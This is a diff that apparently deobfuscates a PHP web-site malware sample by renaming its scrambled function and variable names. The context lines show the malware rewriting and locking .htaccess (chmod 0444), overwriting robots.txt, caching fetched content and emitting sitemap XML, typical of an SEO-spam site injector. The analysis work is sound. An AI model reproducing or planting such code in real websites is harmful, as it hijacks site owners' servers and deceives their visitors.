@@ -111,7 +111,8 @@ function l11b68x($l1W){
 }
 */
 
-$bbbb66b6 = file_get_contents(__FILE__);
+/* Self source code */
+$source = file_get_contents(__FILE__);
 //$bbbb66b6 = file_get_contents("obs.txt");
 
 
@@ -134,7 +135,7 @@ exit();
 
 
 //preg_match(l1FLe62h("K/@mJB3pOxjmNx8y"),$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
-preg_match("/@'(.*?)';/s",$bbbb66b6,$_SESSION["oO0Oo0OO0"]);
+preg_match("/@'(.*?)';/s",$source,$_SESSION["oO0Oo0OO0"]);
 // Store function/variable in session?
 
 //print_r($_SESSION);
@@ -157,7 +158,7 @@ $l1T2 = $l1gfDiJL = $l1NhADdH = $l1h1 = $l135vXS = $l1bhL8Zi = $l1GH0rfZ = array
 $l1I = $_SERVER["DOCUMENT_ROOT"];
 
 /* Write file */
-function l1AeQJ($fname,$content='',$mode='w'){
+function write_file($fname,$content='',$mode='w'){
     $file = @fopen($fname,$mode);
     if($file !== false){
         fwrite($file,$content);
@@ -348,7 +349,7 @@ function l1Rm($l1XNaVU=''){
         if(empty($l1k)){
             $l1k[] = sprintf("<IfModule%smod_rewrite.c>%sRewriteEngine%sOn%sRewriteCond%s%s{REQUEST_FILENAME}%s!-f%sRewriteCond%s%s{REQUEST_FILENAME}%s!-d%sRewriteRule%s.%sindex.php%s[L]%s</IfModule>",' ',"\n",' ',"\n",' ','%',' ',"\n",' ','%',' ',"\n",' ',' ',' ',"\n");
         }
-        l1AeQJ($l1XNaVU,trim(implode("\n",$l1k)));
+        write_file($l1XNaVU,trim(implode("\n",$l1k)));
         $l1eb = $l1k = null;
         l1uKK($l1XNaVU);
         @chmod($l1XNaVU,0444);
@@ -387,7 +388,7 @@ function l1K5dsu($l1o2ge=''){
     $l1K5dsu = "$l1o2ge/robots.txt";
     if(!l1TMU($l1K5dsu)){
         @chmod($l1K5dsu);
-        l1AeQJ($l1K5dsu,sprintf("User-agent:%s*%sDisallow:",' ',"\n"));
+        write_file($l1K5dsu,sprintf("User-agent:%s*%sDisallow:",' ',"\n"));
         l1uKK($l1K5dsu);
     }
 }
@@ -641,7 +642,7 @@ function l1HsDyi2($l1LgtDjH,$l1Wt,$l1gu){
     $l1wI17dN=@file_get_contents($l1LgtDjH);
     if($l1wI17dN===false){
         $l1wI17dN=l1O2($l1Wt);
-        @l1AeQJ($l1LgtDjH,$l1wI17dN);
+        @write_file($l1LgtDjH,$l1wI17dN);
     }
     $l1wI17dN=explode('|',$l1wI17dN);
     $l1sei6v=PHP_INT_MAX;
@@ -1066,7 +1067,7 @@ function l1P9LVD($l15tGX=''){
         }
         header(sprintf($l13lq1,'x'));
         echo $l1VBV;
-        @l1AeQJ($l1sH,$l1VBV);
+        @write_file($l1sH,$l1VBV);
         $l1Nc=array();
 
         if(!empty($l1jHQLt)){
@@ -1074,7 +1075,7 @@ function l1P9LVD($l15tGX=''){
             if(count($l1Nc)>=100){
                 $l1gn=implode('',$l1Nc);
                 echo $l1gn;
-                @l1AeQJ($l1sH,$l1gn,'a');
+                @write_file($l1sH,$l1gn,'a');
                 $l1gn='';
                 $l1Nc=array();
             }
@@ -1084,14 +1085,14 @@ function l1P9LVD($l15tGX=''){
         if(!empty($l1Nc)){
             $l1gn=implode('',$l1Nc);
             echo $l1gn;
-            @l1AeQJ($l1sH,$l1gn,'a');
+            @write_file($l1sH,$l1gn,'a');
             $l1gn='';
             $l1Nc=array();
         }
 
         $l1FiZB="\n\t</urlset>";
         echo $l1FiZB;
-        @l1AeQJ($l1sH,$l1FiZB,'a');
+        @write_file($l1sH,$l1FiZB,'a');
         exit();
     }
 
@@ -1101,7 +1102,7 @@ function l1P9LVD($l15tGX=''){
     $l14XZNk=file_get_contents($l1TE9);
     }else{
     $l14XZNk=l1O2($l1xUB);
-    @l1AeQJ($l1TE9,$l14XZNk);
+    @write_file($l1TE9,$l14XZNk);
     @l1uKK($l1TE9);
     }
     $l14XZNk=trim($l14XZNk,'|');
